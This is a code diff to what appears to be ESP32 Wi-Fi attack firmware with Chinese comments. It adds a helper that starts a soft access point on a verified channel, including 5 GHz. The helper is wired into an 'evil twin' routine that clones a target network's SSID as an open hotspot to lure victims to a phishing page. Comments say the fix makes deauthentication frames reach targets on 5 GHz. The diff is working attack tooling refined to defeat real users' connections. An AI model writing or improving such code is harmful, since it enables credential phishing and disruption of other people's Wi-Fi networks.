@@ -1083,6 +1083,32 @@ static bool applyApChannel(uint8_t ch) {
   return false;
 }
 
+// 在指定信道启动软 AP (克隆热点/恢复原热点共用)。
+// 双频芯片上 5G 信道必须先切频段模式: 否则 softAP 会「返回 true 但驻留在 2.4G」,
+// 而 apChannelActive 仍记为 5G → 后续 Deauth 全发在错误频段, 表现为帧数一直涨、
+// 目标手机却毫无反应 (真机踩坑: 目标在 5G ch149, 攻击却停在 ch11)。
+// 启动后一律用 esp_wifi_get_channel 校验实际信道, 不一致时走硬重配。
+static bool startSoftApOnChannel(const String &ssid, const char *pass, uint8_t ch,
+                                 int hidden, uint8_t maxConn) {
+  if (!isValidApChannel(ch)) return false;
+#if defined(SOC_WIFI_SUPPORT_5G) && SOC_WIFI_SUPPORT_5G
+  // 5G AP 带宽统一 HT20: 与目标 AP 带宽不一致时部分手机会拒绝关联
+  esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
+  esp_wifi_set_band_mode(isBand5G(ch) ? WIFI_BAND_MODE_5G_ONLY : WIFI_BAND_MODE_2G_ONLY);
+#endif
+  const String useSsid = ssid.length() ? ssid : apSsid;
+  if (!WiFi.softAP(useSsid.c_str(), pass, ch, hidden, maxConn)) return false;
+  uint8_t cur = 0;
+  wifi_second_chan_t sec;
+  if (esp_wifi_get_channel(&cur, &sec) == ESP_OK && cur == ch) {
+    apChannelActive = ch;
+    return true;
+  }
+  log("[rf] softAP 未按请求信道启动 (请求 ch" + String(ch) + " 实际 ch" + String(cur) +
+      ") → 硬重配" + (isBand5G(ch) ? " (5G)" : ""));
+  return reconfigApChannelHard(ch);
+}
+
 /* ---------------- 3. 握手包捕获与离线弱口令跑包 (Handshake & Crack) ----------------
  *
  * 真实实现 (不再按时间戳伪造 M1..M4):
@@ -2747,8 +2773,10 @@ static bool eviltwinStartAttack(String &err) {
   }
 
   // 3) 阶段 2: 热点真实改名 — 与目标一模一样的 SSID + 开放无密码 (victim 免密即可接入钓鱼页) + 主目标信道
-  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
-    err = "克隆热点启动失败 (SSID 改名 + 开放认证)";
+  //    5G 目标 (如 ch149) 走 startSoftApOnChannel: 先切频段再起 AP 并校验真实信道
+  if (!startSoftApOnChannel(sEvilTwin.cloneSsid, nullptr, (uint8_t)sTarget.channel, 0, 4)) {
+    err = "克隆热点启动失败 (SSID 改名 + 开放认证 @ch" + String(sTarget.channel) +
+          (isBand5G((uint8_t)sTarget.channel) ? ", 5G 信道可能不受本机 AP 支持" : "") + ")";
     return false;
   }
   apChannelActive = (uint8_t)sTarget.channel;
@@ -2784,8 +2812,8 @@ static bool eviltwinEnterClonePhase(bool gotHs) {
     delay(80);
   }
 
-  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
-    log("[eviltwin] 克隆热点启动失败 (SSID 改名 + 开放认证)");
+  if (!startSoftApOnChannel(sEvilTwin.cloneSsid, nullptr, (uint8_t)sTarget.channel, 0, 4)) {
+    log("[eviltwin] 克隆热点启动失败 (SSID 改名 + 开放认证 @ch" + String(sTarget.channel) + ")");
     return false;
   }
   apChannelActive = (uint8_t)sTarget.channel;
@@ -2860,9 +2888,9 @@ static void eviltwinStopAttack(bool restoreAp) {
     if (WiFi.getMode() != WIFI_AP_STA) {
       WiFi.mode(WIFI_AP_STA);
       delay(80);
-      WiFi.softAP(sEvilTwin.restoreSsid.length() ? sEvilTwin.restoreSsid.c_str() : apSsid.c_str(),
-                  AP_PASSWORD, sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel,
-                  false, 4);
+      startSoftApOnChannel(sEvilTwin.restoreSsid.length() ? sEvilTwin.restoreSsid : apSsid,
+                           AP_PASSWORD, sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel,
+                           0, 4);
       apChannelActive = sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel;
     }
     sEvilTwin.apCloned = false;
@@ -2882,7 +2910,7 @@ static void eviltwinStopAttack(bool restoreAp) {
   sEvilTwin.twinFramesLeft = 0;
   sEvilTwin.beaconLeft = 0;
   if (restoreAp && sEvilTwin.apCloned) {
-    WiFi.softAP(sEvilTwin.restoreSsid.c_str(), AP_PASSWORD, sEvilTwin.restoreChannel, false, 4);
+    startSoftApOnChannel(sEvilTwin.restoreSsid, AP_PASSWORD, sEvilTwin.restoreChannel, 0, 4);
     apChannelActive = sEvilTwin.restoreChannel;
     sEvilTwin.apCloned = false;
   }
@@ -4774,10 +4802,10 @@ static void restartWifiAp() {
   esp_wifi_start();
   WiFi.mode(WIFI_AP_STA);
   applyWifiCountry();   // 射频重启后国家信道计划会回默认, 必须重新应用
-  if (!WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4)) {
+  if (!startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4)) {
     log("[wifi] 重启后 softAP 启动失败, 将重试 …");
     delay(2000);
-    WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
+    startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4);
   }
   apChannelActive = apChannel;
   log("[wifi] WiFi 射频已重启: SSID=" + apSsid + "  信道=" + String(apChannel));
@@ -5295,10 +5323,10 @@ void setup() {
   String savedSsid = sPrefs.getString("ssid", "");
   apSsid = (savedSsid.length() > 0) ? savedSsid : defaultSsid;
 
-  if (!WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4)) {
+  if (!startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4)) {
     log("[wifi] softAP 启动失败, 将重试 …");
     delay(2000);
-    WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
+    startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4);
   }
   apChannelActive = apChannel;  // 记录开机实际信道 (后续攻击可临时切换, 配置值不变)
   log("[wifi] AP 已启动: SSID=" + apSsid + "  信道=" +
